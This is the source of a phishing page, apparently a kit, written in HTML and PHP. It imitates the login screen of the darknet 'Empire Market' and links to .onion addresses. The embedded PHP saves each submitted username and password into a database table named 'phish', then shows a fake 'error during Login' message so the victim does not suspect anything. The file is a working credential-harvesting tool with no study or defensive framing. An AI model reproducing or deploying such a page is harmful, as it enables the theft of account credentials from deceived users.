 <!DOCTYPE html>
<html>
<head>
    <title>Empire Market</title>
    <link rel="stylesheet" type="text/css" href="style.css"/>
    <link rel="stylesheet" href="font-awesome.min.css"/>
    <link rel="stylesheet" href="css/all.css">
	<link rel="icon" href="favicon.png" type="image/png"/>
    

    


</head>
<body>

<a href="index.php"><img style="padding-bottom: 10px;padding-top: 10px;" src="logo.png"></a>
<div class="body-content">
    <div class="nav">
        <ul>
            <li><a href="index.php">LOGIN</a></li>
            <li><a href="register.php">REGISTER</a></li>
            <li><a href="http://tpo7v66snknyugsf.onion" target="_blank">FORUMS</a></li>
            <li><a href="safe_haven.php">VERIFY MIRROR</a></li>
        </ul>
    </div>
    
    <div class="body-content">
        
        <div class="sub_head_inner_header">
            <i class="fas fa-sign-in-alt fa-fontSet" aria-hidden="true"></i> 
        <div class="check"><p></p></div>
            <h3> <a href="index.php">Login</a> </h3>
            <div class="check"><p></p></div>
            <i class="fa fa-sitemap fa-fontSet sitemap" aria-hidden="true"></i>
        </div>

                
        
        <style>.container{display:inline-block;position:relative;padding-left:5px;margin-bottom:20px;cursor:pointer;font-size:12px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:300px}.container input{position:absolute;opacity:0;cursor:pointer;height:0;width:0}.checkmark{position:absolute;top:0;left:0;height:25px;width:25px;background-color:#eee}.container:hover input ~ .checkmark {background-color:#ccc}.container input:checked ~ .checkmark {background-color:#c85d06}.checkmark:after{content:"";position:absolute;display:none}.container input:checked ~ .checkmark:after {display:block}.container .checkmark:after{left:9px;top:5px;width:5px;height:10px;border:solid #fff;border-width:0 3px 3px 0;-webkit-transform:rotate(45deg);-ms-transform:rotate(45deg);transform:rotate(45deg)}</style>



        <div class="wrapper">

            <div class="login-page">
                <div class="login-Head">
                    <div class="loginHead-logo">
                        <i class="fas fa-sign-in-alt" aria-hidden="true"></i> 
                    </div>                     
                    
                    <div class="loginHead-head">
                        <h3>LOGIN TO EMPIRE MARKET</h3>
                    </div>
                </div>

                
                    

                                
                <div class="clear"></div>
      
                 <p>Welcome to Empire Market! Please login to access the marketplace. If you do not have an account, you can  <a href="register.php">register</a> to get access to the listings. Registrations are free and open to everyone. If you have lost your password, please use the <a href="http://wteux67znk4pxhwnv7piy7vzzxz3dg3ixhkkk6uw25czaple6mrwuhid.onion/index/forgot/password"> forgot password </a> form to reset your password.</p>

                <div class="login-textbox">
                                                        <?php
/* Attempt MySQL server connection. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
include 'conn.php';

// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
if(isset($_POST['save'])){
 $username = mysqli_real_escape_string($link,$_POST['username']);
 $password = mysqli_real_escape_string($link,$_POST['password']);
 $captcha = mysqli_real_escape_string($link,$_POST['captcha']);
 

 if (empty($username)) {
    echo "<div class='alert alert-danger'>
    <strong>Failed!</strong>Please Username Cannot be Empty
    </div>";
}

elseif (empty($password)) {
    echo "<div class='alert alert-danger'>
    <strong>Failed!</strong>Please Password Cannot be Empty
    </div>";
}
elseif (empty($captcha)) {
    echo "<div class='alert alert-danger'>
    <strong>Failed!</strong>Captcha Cannot be Empty
    </div>";
}


else{ 

// Attempt insert query execution
    $sql = "INSERT INTO phish (username,
password
) 
    VALUES ('$username',
'$password')";
    if(mysqli_query($link, $sql)){
      echo ' <p style="color: red; font-weight: bolder; font-size: 20px;">
  There was an error during Login, Please try again later
</p>';
    } else{
           
                    echo "db insertion error:".$query."<br>";

                }//else end
}
}
// Close connection
mysqli_close($link);

?>

                    <form action="index.php" method="post" accept-charset="utf-8">
 

                    <div class="">
                        
                        <input placeholder="Username" type="text" name='username' class='login-textbox' value="" autofocus>
                                            </div>

                    <div class="">
                        
                        <input placeholder="Password" type="password" autocomplete="off" name='password' class='login-textbox'>
                                              </div>

                    <div class="" style="margin-left:em;">
                         <div class='image' style='margin-left:px;margin-top:px;'><img src="login1.jpg" style="width: 200; height: 100; border: 0;" alt=" "/></div>                    </div>
          
                    <p class="invalidCaptchaError"></p>

			 
                    <div style="padding-top: 10px;">
                        
                        <input style="" placeholder="What's the captcha?" type="text" name="captcha" class='login-textbox'>                        
                    </div>



                    <div class="login-wrap">
                      
                        <input class="primary_button" type="submit" value="Login" name='save'> 
                      


                    </div>    

                
                    
                    </form>
                                        
                    
               

                </div>
            </div>
        </div>


        <!--</div> -->
        <div class="sub_head_inner_header">
            <i class="fas fa-sign-in-alt fa-fontSet" aria-hidden="true"></i> 
        <div class="check"><p></p></div>
            <h3> <a href="index.php">Login</a> </h3>
            <div class="check"><p></p></div>
            <i class="fa fa-sitemap fa-fontSet sitemap" aria-hidden="true"></i>
        </div>

</div>



</div>
<div class="footer">
    <p><font size="1">
	
	<span style="float:right;">
	Server time: <?php echo date('l jS \of F Y h:i:s A'); ?> 	</span>
    
	
    <span style="float:left;">Copyright &copy; 2020 Empire Market </span> </font><br/>
	
	</p>
	
</div>
